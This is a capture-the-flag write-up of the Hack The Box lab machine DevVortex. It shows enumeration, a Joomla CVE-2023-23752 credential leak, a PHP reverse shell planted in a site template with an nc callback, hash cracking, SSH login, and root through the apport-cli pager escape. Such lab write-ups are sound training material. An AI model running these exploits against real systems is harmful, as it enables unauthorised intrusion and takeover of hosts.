---
layout: post
title:  HTB DevVortex Write-up
description: Part of the OSCP+ Preparation Series
date:   2024-11-20 17:00:00 +0300
image:  '/images/htb_devvortex.png'
tags:   [Write-ups, HTB, OSCP+, Linux, Easy, Vhost-Enumeration, CVE, Joomla, MySQL, Credentials-in-Database, apport-cli]
---

# Table of Contents
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
  - [Web Enumeration](#web-enumeration)
  - [Vhost Enumeration](#web-enumeration)
- [Foothold](#foothold)
  - [CVE-2023-23752 Unauthenticated Information Disclosure](#cve-2023-27163-request-baskets-121--to-expose-target-local-port-80)
  - [Using lewis credentials to log into Joomla and use a PHP reverse shell to get access](#maltrail-rce-exploit-to-get-access-as-puma)
  - [Finding credentials of logan in MySQL database and getting access with SSH](#maltrail-rce-exploit-to-get-access-as-puma)
- [Privilege Escalation](#privilege-escalation)
  - [CVE-2023-1326 apport-cli](#cve-2023-26604-systemctl-to-escalate-privileges)

# Enumeration

### Nmap 10.129.133.100
```shell
# Step 1 - Find active ports
nmap -p- -Pn --min-rate 10000 10.129.133.100

# Step 2 - Focus scan on the active ports found
nmap -A -T4 -Pn -p22,80 10.129.133.100
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-20 10:35 EST
Nmap scan report for 10.129.133.100
Host is up (0.033s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.56 seconds
```

Examining our nmap scan, we found port 22 SSH and port 80 HTTP open.

We also found devvortex.htb. Lets add it to /etc/hosts:

```shell
echo "10.129.133.100 devvortex.htb" | sudo tee -a /etc/hosts
```

### Web Enumeration
Lets take a look at the website:

```shell
http://devvortex.htb/
```

Looks like the website of a company.

Lets use feroxbuster for further enumeration:

```shell
feroxbuster -u http://devvortex.htb
```

Nothing interesting.
### Vhost Enumeration
Lets see if we can find a vhost:

```shell
gobuster vhost -u http://devvortex.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -r
```

We can run the command above multiple times if we get a deadline excedeed error.

Examining the results, we found this vhost:

```shell
dev.devvortex.htb
```

Lets add it to /etc/hosts:

```shell
echo "10.129.133.100 dev.devvortex.htb" | sudo tee -a /etc/hosts
```

Now we can visit it:

```shell
http://dev.devvortex.htb
```

Still nothing likely exploitable.

Lets use feroxbuster:

```shell
feroxbuster -u http://dev.devvortex.htb
```

Examining the results we can find the following link leading us to a Joomla login portal:

```shell
http://dev.devvortex.htb/administrator
```

Searching online, I found a way to enumerate the Joomla version visiting the following URL:

```shell
http://dev.devvortex.htb/administrator/manifests/files/joomla.xml
```

Inside the joomla.xml we found the Joomla version 4.2.6.

Lets search for an exploit for this version.

# Foothold
### CVE-2023-23752 Unauthenticated Information Disclosure
Searching online, I found the CVE-2023-23752, which the Joomla 4.2.6 version is vulnerable to.

We can use the curl command as follow to get some information:

```shell
curl http://dev.devvortex.htb/api/index.php/v1/config/application?public=true | jq
```

Here we found what it seems to be the credentials of the user lweis:

```shell
 {
      "type": "application",
      "id": "224",
      "attributes": {
        "user": "lewis",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "password": "P4ntherg0t1n5r3c0n##",
        "id": 224
      }
```

```shell
lewis:P4ntherg0t1n5r3c0n##
```

### Using lewis credentials to log into Joomla and use a PHP reverse shell to get access

Now we can use the credentials of lewis to get access:

```shell
http://dev.devvortex.htb/administrator
```

The user lewis is a Super User.

We can abuse this putting a PHP reverse shell inside a template page.

```shell
Go to -> System -> Site Templates -> Cassiopeia Details and Files -> Edit error.php -> Enter PHP Ivan Sincek code at the end of the code inside error.php -> Click on Save
```

Now start our nc listener:

```shell
nc -lvnp 8443
```

Visit the following URL to trigger the URL:

```shell
curl -k "http://dev.devvortex.htb/templates/cassiopeia/error.php/error"
```

This will trigger our reverse shell and give us a response on our nc listener:

```shell
listening on [any] 8443 ...
connect to [10.10.14.206] from (UNKNOWN) [10.129.133.100] 57568
SOCKET: Shell has connected! PID: 1030
whoami
www-data
```

If we have problems triggering our reverse shell, try clicking on Save and then Template Preview.

Lets upgrade our shell now:

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Or using
script /dev/null -c bash
```

### Finding credentials of logan in MySQL database and getting access with SSH
Enumerating the system using the following commands we found the port 3306 running:

```shell
ss -tulnp
```

```shell
tcp     LISTEN   0        151            127.0.0.1:3306           0.0.0.0:*
```

We can also see the credentials of lewis in the following file:

```shell
cat configuration.php
```

```shell
<SNIP>
        public $debug = false;
        public $debug_lang = false;
        public $debug_lang_const = true;
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'lewis';
        public $password = 'P4ntherg0t1n5r3c0n##';
        public $db = 'joomla';
        public $dbprefix = 'sd4fg_';
        public $dbencryption = 0;
        public $dbsslverifyservercert = false;
<SNIP>
```

Lets access mysql using the credentials of lewis:

```shell
mysql -u lewis -p
# Enter password: P4ntherg0t1n5r3c0n##
```

Using the following query commands in the mysql console we will be able to find the hash of the user logan:

```shell
show databases;
use joomla;
show tables;
select * from sd4fg_users;
```

Now we got the hash of the user logan:

```shell
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj1
```

Lets try to crack it:

```shell
# Note: Looking at the start of the hash $2y$ I know from past CTFs that this is a bcrypt hash and that it has -m 3200 on hashcat, but you can use hashcat -h | grep $2 to search for the mode
echo '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12' > logan_hash.txt
hashcat -m 3200 logan_hash.txt /usr/share/wordlists/rockyou.txt
```

We were able to crack the hash successfully, giving us the following credentials:
```shell
logan:tequieromucho
```

Now we can get access using SSH:

```shell
ssh logan@10.129.133.100
```

### User Flag
Now we can get the user.txt flag:

```shell
cat /home/logan/user.txt
```

# Privilege Escalation
### CVE-2023-1326 apport-cli
If we use sudo -l, we will get the following output:

```shell
[sudo] password for logan: 
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

Lets check the version of apport-cli:

```shell
/usr/bin/apport-cli --version
```

```shell
2.20.11
```

Doing some research, we found out that this version is vulnerable to CVE-2023-1326.

We can exploit this to escalate privileges with the following steps:

```shell
# Get the PID of systemd (in our case 1030)
ps -ux
```

```shell
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
logan       1030  0.0  0.2  19040  9616 ?        Ss   17:01   0:00 /lib/systemd/systemd --user
logan       1036  0.0  0.0 169184  3260 ?        S    17:01   0:00 (sd-pam)
logan       1332  0.0  0.1  14064  5968 ?        S    17:03   0:00 sshd: logan@pts/1
logan       1333  0.0  0.1   8272  5096 pts/1    Ss+  17:03   0:00 -bash
logan       1445  0.0  0.1  14064  6064 ?        S    17:07   0:00 sshd: logan@pts/0
logan       1446  1.0  0.1   8272  5056 pts/0    Ss   17:07   0:00 -bash
logan       1454  0.0  0.0   9080  3496 pts/0    R+   17:07   0:00 ps -ux
```

Once we got the PID, run the following commands:

```shell
# Run apport-cli with the PID 1030 of systemd
sudo /usr/bin/apport-cli -f -P 1030

# Then press the correct keys in this order

# *** It seems you have modified the contents of "/etc/systemd/journald.conf".  Would you like to add the contents of it to your bug report?
# What would you like to do? Your options are:
Press Y

# *** It seems you have modified the contents of "/etc/systemd/resolved.conf".  Would you like to add the contents of it to your bug report?
# What would you like to do? Your options are:
Press Y

# *** Send problem report to the developers?

# After the problem report has been sent, please fill out the form in the
automatically opened web browser.
# What would you like to do? Your options are:
Press V

# Please choose (S/V/K/I/C):
V

# Now enter the following when the ":" symbol appears
!/bin/bash

# Press enter once we wrote it, it will give us a shell as root
```

### Root Flag
Now we can get the root.txt flag:

```shell
cat /root/root.txt
```